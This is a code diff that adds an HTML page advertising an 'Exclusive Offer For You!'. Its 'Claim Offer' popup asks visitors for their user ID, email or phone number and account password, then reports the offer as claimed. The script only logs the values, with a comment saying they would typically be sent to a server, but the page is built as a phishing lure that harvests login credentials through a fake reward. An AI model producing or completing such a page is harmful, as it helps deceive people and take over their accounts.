@@ -1,4 +1,305 @@
-<optgroup>
-    <option value="">hi</option>
-    opt+
-</optgroup>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Custom Offer Square</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        
+        .offer-container {
+            position: relative;
+            width: 90vw;
+            height: 25vh;
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
+            border-radius: 15px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        
+        .offer-image {
+            width: 150px;
+            height: 150px;
+            object-fit: unset;
+            border-radius: 10px;
+            border: 3px solid white;
+        }
+        
+        .offer-title {
+            color: white;
+            font-size: 22px;
+            font-weight: bold;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .offer-button {
+            background-color: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .offer-button:hover {
+            background-color: #ff5252;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+        }
+        
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .popup-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .popup-container {
+            background-color: white;
+            width: 80%;
+            max-width: 400px;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transform: translateY(20px);
+            transition: all 0.3s ease;
+        }
+        
+        .popup-overlay.active .popup-container {
+            transform: translateY(0);
+        }
+        
+        .popup-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #333;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        
+        .submit-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #6e8efb;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+        
+        .submit-button:hover {
+            background-color: #5a7bf5;
+        }
+        
+        .close-button {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: #777;
+        }
+        
+        .switch-container {
+            display: flex;
+            align-items: center;
+            margin-top: 15px;
+        }
+        
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+            margin-right: 10px;
+        }
+        
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 24px;
+        }
+        
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        
+        input:checked + .slider {
+            background-color: #6e8efb;
+        }
+        
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+    </style>
+</head>
+<body>
+    <div class="offer-container">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnNrvRsiciixdEeGguPYi4stuRhvSGdy-4b3__ssrAfPhXoH5HETiXSnAzpOT38X92Lyz8z8bP_yuaoKZO9CHkM7dmggiXqYiChxUzWo-txr3hkEWNP1LhSz5S6n5OmUnpIHPKAGJ4Y-94Nyg9kuRnvfjbg4jk7W4af38W3ymbVaCkt4mTDnUnGiqbeYk/s4096/Picsart_25-05-28_22-48-54-761.png" alt="Special Offer" class="offer-image">
+        <h2 class="offer-title">Exclusive Offer For You!</h2>
+        <button class="offer-button" id="claimButton">Claim Offer</button>
+    </div>
+    
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-container">
+            <button class="close-button" id="closeButton">&times;</button>
+            <h2 class="popup-title">Claim Your Offer</h2>
+            <form id="claimForm">
+                <div class="form-group">
+                    <label for="uid">User ID</label>
+                    <input type="text" id="uid" placeholder="Enter your UID" required>
+                </div>
+                <div class="form-group">
+                    <label for="emailPhone">Email or Phone Number</label>
+                    <input type="text" id="emailPhone" placeholder="Enter email or phone" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter password" required>
+                </div>
+                <div class="switch-container">
+                    <label class="switch">
+                        <input type="checkbox" id="rememberMe">
+                        <span class="slider"></span>
+                    </label>
+                    <label for="rememberMe">Remember me</label>
+                </div>
+                <button type="submit" class="submit-button">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const claimButton = document.getElementById('claimButton');
+            const popupOverlay = document.getElementById('popupOverlay');
+            const closeButton = document.getElementById('closeButton');
+            const claimForm = document.getElementById('claimForm');
+            
+            // Show popup when claim button is clicked
+            claimButton.addEventListener('click', function() {
+                popupOverlay.classList.add('active');
+            });
+            
+            // Close popup when close button is clicked
+            closeButton.addEventListener('click', function() {
+                popupOverlay.classList.remove('active');
+            });
+            
+            // Close popup when clicking outside the form
+            popupOverlay.addEventListener('click', function(e) {
+                if (e.target === popupOverlay) {
+                    popupOverlay.classList.remove('active');
+                }
+            });
+            
+            // Handle form submission
+            claimForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Get form values
+                const uid = document.getElementById('uid').value;
+                const emailPhone = document.getElementById('emailPhone').value;
+                const password = document.getElementById('password').value;
+                const rememberMe = document.getElementById('rememberMe').checked;
+                
+                // Here you would typically send the data to a server
+                console.log('Form submitted:', {
+                    uid,
+                    emailPhone,
+                    password,
+                    rememberMe
+                });
+                
+                // Show success message (in a real app, you'd wait for server response)
+                alert('Your offer has been claimed successfully!');
+                
+                // Close the popup
+                popupOverlay.classList.remove('active');
+                
+                // Reset the form
+                claimForm.reset();
+            });
+        });
+    </script>
+</body>
+</html>
